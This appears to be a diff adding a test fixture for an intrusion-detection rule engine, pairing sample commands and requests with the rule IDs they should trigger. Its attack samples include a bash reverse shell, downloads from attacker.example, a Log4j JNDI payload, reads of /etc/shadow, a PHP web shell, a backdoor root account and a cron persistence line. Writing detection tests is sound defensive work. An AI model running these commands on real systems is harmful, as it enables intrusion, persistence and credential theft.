@@ -1,0 +1,60 @@
+{"source_kind": "auth_attempt", "payload": {"username": "root", "service": "ssh", "result": "fail", "tool": "hydra"}, "expected_rule_ids": ["R0001"], "label": "hydra_ssh_brute"}
+{"source_kind": "auth_attempt", "payload": {"username": "root", "service": "ssh", "result": "fail", "tool": "medusa"}, "expected_rule_ids": ["R0001"], "label": "medusa_ssh_brute"}
+{"source_kind": "auth_attempt", "payload": {"username": "root", "service": "ssh", "result": "fail", "tool": "ncrack"}, "expected_rule_ids": ["R0001"], "label": "ncrack_ssh"}
+{"source_kind": "http_request", "payload": {"raw_url": "/index.php?id=1", "user_agent": "sqlmap/1.7.0#stable (https://sqlmap.org)"}, "expected_rule_ids": ["R0007"], "label": "sqlmap_user_agent"}
+{"source_kind": "http_request", "payload": {"raw_url": "/", "user_agent": "Mozilla/5.0 nikto/2.5.0"}, "expected_rule_ids": ["R0007"], "label": "nikto_user_agent"}
+{"source_kind": "http_request", "payload": {"raw_url": "/api?x=${jndi:ldap://evil.example/a}", "user_agent": "curl/7.x"}, "expected_rule_ids": ["R0008"], "label": "log4j_jndi_in_url"}
+{"source_kind": "http_request", "payload": {"raw_url": "/page?file=../../../../etc/passwd", "user_agent": "curl/7.x"}, "expected_rule_ids": ["R0009"], "label": "http_path_traversal"}
+{"source_kind": "http_request", "payload": {"raw_url": "/", "user_agent": "Mozilla/5.0"}, "expected_rule_ids": [], "label": "negative_http_normal"}
+{"source_kind": "command", "payload": {"command_text": "/bin/sh -c 'id'"}, "expected_rule_ids": ["R0010", "R0011"], "label": "sh_dash_c_id"}
+{"source_kind": "command", "payload": {"command_text": "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"}, "expected_rule_ids": ["R0010"], "label": "bash_revshell_devtcp"}
+{"source_kind": "command", "payload": {"command_text": "python3 -c 'import os; os.system(\"id\")'"}, "expected_rule_ids": ["R0011"], "label": "python_oneliner"}
+{"source_kind": "command", "payload": {"command_text": "wget http://attacker.example/payload.sh -O /tmp/p.sh"}, "expected_rule_ids": ["R0012"], "label": "wget_http_payload"}
+{"source_kind": "command", "payload": {"command_text": "curl -O http://attacker.example/loader.bin"}, "expected_rule_ids": ["R0012"], "label": "curl_http_loader"}
+{"source_kind": "command", "payload": {"command_text": "cat /etc/passwd"}, "expected_rule_ids": ["R0013"], "label": "cat_etc_passwd"}
+{"source_kind": "command", "payload": {"command_text": "less /etc/passwd"}, "expected_rule_ids": ["R0013"], "label": "less_etc_passwd"}
+{"source_kind": "command", "payload": {"command_text": "head /etc/passwd"}, "expected_rule_ids": ["R0013"], "label": "head_etc_passwd"}
+{"source_kind": "command", "payload": {"command_text": "cat /etc/shadow"}, "expected_rule_ids": ["R0014"], "label": "cat_etc_shadow"}
+{"source_kind": "command", "payload": {"command_text": "sudo cat /etc/shadow"}, "expected_rule_ids": ["R0014"], "label": "sudo_cat_etc_shadow"}
+{"source_kind": "command", "payload": {"command_text": "find / -perm -u=s -type f 2>/dev/null"}, "expected_rule_ids": ["R0015", "R0016"], "label": "find_suid"}
+{"source_kind": "command", "payload": {"command_text": "find / -perm -4000"}, "expected_rule_ids": ["R0015", "R0016"], "label": "find_perm_4000"}
+{"source_kind": "command", "payload": {"command_text": "find / -name '*.conf'"}, "expected_rule_ids": ["R0016"], "label": "find_recursive_no_suid"}
+{"source_kind": "command", "payload": {"command_text": "find /home -name id_rsa"}, "expected_rule_ids": ["R0016"], "label": "find_home_idrsa"}
+{"source_kind": "command", "payload": {"command_text": "nmap -sS -p 1-65535 10.0.0.0/24"}, "expected_rule_ids": ["R0017"], "label": "nmap_scan"}
+{"source_kind": "command", "payload": {"command_text": "masscan 10.0.0.0/8 -p443"}, "expected_rule_ids": ["R0017"], "label": "masscan"}
+{"source_kind": "command", "payload": {"command_text": "rustscan -a 10.0.0.0/24"}, "expected_rule_ids": ["R0017"], "label": "rustscan"}
+{"source_kind": "command", "payload": {"command_text": "uname -a"}, "expected_rule_ids": ["R0018"], "label": "uname_a"}
+{"source_kind": "command", "payload": {"command_text": "lsb_release -a"}, "expected_rule_ids": ["R0018"], "label": "lsb_release"}
+{"source_kind": "command", "payload": {"command_text": "cat /etc/os-release"}, "expected_rule_ids": ["R0018"], "label": "cat_os_release"}
+{"source_kind": "command", "payload": {"command_text": "id"}, "expected_rule_ids": ["R0019"], "label": "id_alone"}
+{"source_kind": "command", "payload": {"command_text": "whoami"}, "expected_rule_ids": ["R0019"], "label": "whoami"}
+{"source_kind": "command", "payload": {"command_text": "w"}, "expected_rule_ids": ["R0019"], "label": "w_logged_in"}
+{"source_kind": "command", "payload": {"command_text": "ip addr"}, "expected_rule_ids": ["R0020"], "label": "ip_addr"}
+{"source_kind": "command", "payload": {"command_text": "ifconfig -a"}, "expected_rule_ids": ["R0020"], "label": "ifconfig"}
+{"source_kind": "command", "payload": {"command_text": "ip route"}, "expected_rule_ids": ["R0020"], "label": "ip_route"}
+{"source_kind": "command", "payload": {"command_text": "netstat -an"}, "expected_rule_ids": ["R0021"], "label": "netstat_an"}
+{"source_kind": "command", "payload": {"command_text": "ss -tnp"}, "expected_rule_ids": ["R0021"], "label": "ss_tnp"}
+{"source_kind": "command", "payload": {"command_text": "lsof -i :22"}, "expected_rule_ids": ["R0021"], "label": "lsof_i"}
+{"source_kind": "command", "payload": {"command_text": "ldapsearch -x -b dc=example,dc=com '(objectClass=user)'"}, "expected_rule_ids": ["R0022"], "label": "ldapsearch"}
+{"source_kind": "command", "payload": {"command_text": "bloodhound-python -d example.com -u user -p pass"}, "expected_rule_ids": ["R0022"], "label": "bloodhound_python"}
+{"source_kind": "command", "payload": {"command_text": "smbclient -L //10.0.0.1"}, "expected_rule_ids": ["R0023"], "label": "smbclient_list"}
+{"source_kind": "command", "payload": {"command_text": "enum4linux -a 10.0.0.1"}, "expected_rule_ids": ["R0023"], "label": "enum4linux"}
+{"source_kind": "command", "payload": {"command_text": "useradd -m -s /bin/bash backdoor"}, "expected_rule_ids": ["R0024"], "label": "useradd"}
+{"source_kind": "command", "payload": {"command_text": "adduser --gecos '' backdoor"}, "expected_rule_ids": ["R0024"], "label": "adduser"}
+{"source_kind": "command", "payload": {"command_text": "echo 'evil:x:0:0::/root:/bin/bash' >> /etc/passwd"}, "expected_rule_ids": ["R0024"], "label": "echo_etc_passwd"}
+{"source_kind": "command", "payload": {"command_text": "echo '* * * * * curl http://x.example/a' >> /var/spool/cron/root"}, "expected_rule_ids": ["R0025", "R0012"], "label": "cron_persist"}
+{"source_kind": "command", "payload": {"command_text": "crontab -e"}, "expected_rule_ids": ["R0025"], "label": "crontab_e"}
+{"source_kind": "command", "payload": {"command_text": "redis-cli -h 10.0.0.5 config set dir /root/.ssh"}, "expected_rule_ids": ["R0026"], "label": "redis_ssh_dir"}
+{"source_kind": "command", "payload": {"command_text": "echo '<?php system($_GET[\"c\"]); ?>' > /var/www/html/x.php"}, "expected_rule_ids": ["R0027"], "label": "webshell_php"}
+{"source_kind": "command", "payload": {"command_text": "history -c"}, "expected_rule_ids": ["R0028"], "label": "history_clear"}
+{"source_kind": "command", "payload": {"command_text": "unset HISTFILE"}, "expected_rule_ids": ["R0028"], "label": "unset_histfile"}
+{"source_kind": "command", "payload": {"command_text": "history -cw"}, "expected_rule_ids": ["R0028"], "label": "history_cw"}
+{"source_kind": "command", "payload": {"command_text": "sudo -l"}, "expected_rule_ids": ["R0029"], "label": "sudo_l"}
+{"source_kind": "command", "payload": {"command_text": "sudo su -"}, "expected_rule_ids": ["R0029"], "label": "sudo_su"}
+{"source_kind": "command", "payload": {"command_text": "sudo -i"}, "expected_rule_ids": ["R0029"], "label": "sudo_i"}
+{"source_kind": "command", "payload": {"command_text": "ls /tmp"}, "expected_rule_ids": [], "label": "negative_ls_tmp"}
+{"source_kind": "command", "payload": {"command_text": "echo hello"}, "expected_rule_ids": [], "label": "negative_echo"}
+{"source_kind": "command", "payload": {"command_text": "cd /var/log"}, "expected_rule_ids": [], "label": "negative_cd"}
+{"source_kind": "command", "payload": {"command_text": "ps aux"}, "expected_rule_ids": [], "label": "negative_ps_aux"}
+{"source_kind": "command", "payload": {"command_text": "df -h"}, "expected_rule_ids": [], "label": "negative_df"}
+{"source_kind": "command", "payload": {"command_text": "free -m"}, "expected_rule_ids": [], "label": "negative_free"}
